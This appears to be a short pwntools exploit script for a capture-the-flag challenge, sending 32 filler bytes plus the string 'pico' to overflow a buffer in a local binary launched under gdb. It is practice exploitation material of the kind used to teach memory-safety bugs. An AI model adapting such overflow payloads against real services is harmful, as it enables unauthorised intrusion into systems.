#!/usr/bin/python3
from pwn import *

REMOTE = False
ip = '127.0.0.1'
port = 80
filepath = './chall'

elf = context.binary = ELF(filepath, checksec=False)
context.terminal = ['tmux', 'splitw', '-v', '-F' '#{pane_pid}', '-P']
if REMOTE is True:
    p = remote(ip, port)
else:
    # p = process(filepath)
    # gdb.attach(p)
    ### OR if you want to start the process with gdb instead of attaching
    p = gdb.debug(filepath, gdbscript='''
    b *main+561
    c
    ''')

payload = 'a' * 0x20 + 'pico'
p.sendlineafter(b'Enter your choice: ', b'2')
p.sendlineafter(b'Data for buffer: ', payload)
p.interactive()
